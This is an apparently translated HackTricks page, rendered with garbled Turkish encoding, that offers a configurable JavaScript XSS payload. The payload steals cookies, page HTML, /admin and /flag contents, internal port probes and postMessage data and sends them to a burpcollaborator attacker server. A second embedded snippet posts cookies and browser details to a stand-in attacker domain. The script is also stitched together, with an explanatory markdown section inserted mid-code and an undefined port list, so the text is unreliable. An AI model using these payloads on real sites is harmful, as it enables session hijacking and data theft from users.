<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
```javascript
// SELECT HERE THE EXFILTRATION MODE (more than 1 can be selected)
// If any GET method is selected (like location or RQ_GET), it's recommended to exfiltrate each info 1 by 1
var ATTACKER_SERVER = "https://weecosb5a2k7jc0cwlyksg9qzh57tw.burpcollaborator.net"
var EXFIL_BY_IMG = false
var EXFIL_BY_RQ_GET = false
var EXFIL_BY_RQ_POST = true
var EXFIL_BY_FETCH_GET = false
var EXFIL_BY_FETCH_POST = false
var EXFIL_BY_NAV = false

var EXFIL_BY_LOC = false
var ALL_INFO = "" // Only used by Location exfiltration


// Function to make the data possible to transmit via either GET or POST
function encode(text){
return encodeURI(btoa(text));
}

// Functions to exfiltrate the information
function exfil_info(info_name, text, is_final=false){
if (EXFIL_BY_IMG)               exfil_by_img(info_name, text);
if (EXFIL_BY_RQ_GET)            exfil_by_rq_get(info_name, text);
if (EXFIL_BY_RQ_POST)           exfil_by_rq_post(info_name, text);
if (EXFIL_BY_FETCH_GET)         exfil_by_fetch_get(info_name, text);
if (EXFIL_BY_FETCH_POST)        exfil_by_fetch_post(info_name, text);
if (EXFIL_BY_NAV)               exfil_by_nav(info_name, text);
if (EXFIL_BY_LOC){
if (is_final) exfil_by_loc(info_name, text);
else ALL_INFO += "\n\n" + info_name + "=" + text;
}
}

function exfil_by_img(info_name, text){
new Image().src = ATTACKER_SERVER + "/exfil_by_img/" + info_name + "?" + info_name + "=" + text
}

function exfil_by_rq_get(info_name, text){
var xhttp = new XMLHttpRequest();
xhttp.open("GET", ATTACKER_SERVER + "/exfil_by_rq_get/" + info_name + "?" + info_name + "=" + text, true);
xhttp.send();
}

function exfil_by_rq_post(info_name, text){
var xhttp = new XMLHttpRequest();
xhttp.open("POST", ATTACKER_SERVER + "/exfil_by_rq_post/" + info_name, true);
xhttp.send(text);
}

function exfil_by_fetch_get(info_name, text){
fetch(ATTACKER_SERVER + "/exfil_by_fetch_get/" + info_name + "?" + info_name + "=" + text, {method: 'GET', mode: 'no-cors'});
}

function exfil_by_fetch_post(info_name, text){
fetch(ATTACKER_SERVER + "/exfil_by_fetch_post/" + info_name, {method: 'POST', mode: 'no-cors', body: text});
}

function exfil_by_nav(info_name, text){
navigator.sendBeacon(ATTACKER_SERVER + "/exfil_by_nav/" + info_name, text)
}

function exfil_by_loc(info_name, text){
document.location = ATTACKER_SERVER + "/exfil_by_loc/?a=" + encode(ALL_INFO);
}


// Functions to get the data to exfiltrate
function exfil_page_content(url){
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
exfil_info(url, encode(xhr.responseText));
}
}
xhr.open('GET', url, true);
xhr.send(null);
}

function exfil_internal_port(port){
fetch("http://127.0.0.1:" + port + "/", { mode: "no-cors" }).then(() => {
exfil_info("internal_port", encode(port));
});
}


// Info to exfiltrate
exfil_info("cookies", encode(document.cookie));
exfil_info("current_url", encode(document.URL));
exfil_info("current_content", encode(document.documentElement.innerHTML));
exfil_page_content("/");
exfil_page_content("/admin"); // If 404 nothing will be sent
exfil_page_content("/flag");
exfil_page_content("/flag.txt");
```markdown
# XSS (Cross Site Scripting) ile Bilgi Ã‡alma

XSS, bir saldÄ±rganÄ±n hedef web uygulamasÄ±na zararlÄ± bir kod enjekte etmesini saÄŸlayan bir saldÄ±rÄ± tÃ¼rÃ¼dÃ¼r. Bu saldÄ±rÄ± tÃ¼rÃ¼, kullanÄ±cÄ±larÄ±n gÃ¼venli olmayan giriÅŸ alanlarÄ±na (Ã¶rneÄŸin, arama kutularÄ±, yorum alanlarÄ±) zararlÄ± kodlarÄ± ekleyerek gerÃ§ekleÅŸtirilir. Bu kodlar, kullanÄ±cÄ±larÄ±n tarayÄ±cÄ±larÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve saldÄ±rganÄ±n istediÄŸi bilgileri Ã§almak veya kullanÄ±cÄ±larÄ± baÅŸka zararlÄ± eylemlere yÃ¶nlendirmek iÃ§in kullanÄ±labilir.

## JavaScript ile Bilgi Ã‡alma

XSS saldÄ±rÄ±larÄ± sÄ±rasÄ±nda en yaygÄ±n kullanÄ±lan yÃ¶ntemlerden biri, JavaScript kodunu kullanarak hedef kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±ndan bilgi Ã§almaktÄ±r. AÅŸaÄŸÄ±daki JavaScript kodu, tarayÄ±cÄ±da Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±ndan Ã§eÅŸitli bilgileri Ã§alar:

```html
<script>
    var stolenInfo = {
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        location: window.location.href,
        screenResolution: window.screen.width + "x" + window.screen.height
    };

    // Ã‡alÄ±nan bilgileri saldÄ±rganÄ±n kontrol ettiÄŸi bir sunucuya gÃ¶nderme
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://saldÄ±rganÄ±n-sunucusu.com/Ã§alÄ±nan-bilgileri-kaydet");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(stolenInfo));
</script>
```

Bu kod, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, `document.cookie` ile Ã§erezleri, `navigator.userAgent` ile tarayÄ±cÄ± kullanÄ±cÄ± ajanÄ±nÄ±, `window.location.href` ile mevcut sayfanÄ±n URL'sini ve `window.screen.width` ve `window.screen.height` ile ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼nÃ¼ Ã§alar. ArdÄ±ndan, Ã§alÄ±nan bilgileri saldÄ±rganÄ±n kontrol ettiÄŸi bir sunucuya gÃ¶nderir.

Bu tÃ¼r bir saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rganÄ±n hedef web uygulamasÄ±nda gÃ¼venli olmayan bir giriÅŸ alanÄ± bulmasÄ± ve bu alanlara zararlÄ± JavaScript kodunu enjekte etmesi gerekir. Bu nedenle, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in giriÅŸ alanlarÄ±nÄ±n doÄŸru bir ÅŸekilde doÄŸrulanmasÄ± ve kullanÄ±cÄ± giriÅŸlerinin gÃ¼venli bir ÅŸekilde iÅŸlenmesi Ã¶nemlidir.
```
```javascript
top_1000.forEach(port => exfil_internal_port(port));

if (EXFIL_BY_LOC){
setTimeout(exfil_info("bitir", "bitir", true), 5000) // 5 saniye sonra konuma gÃ¶re bilgi sÄ±zdÄ±rma
}

// Bilgiyi dinle
window.onmessage = function(e){
exfil_info("onmessage", encode(e.data))
}
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
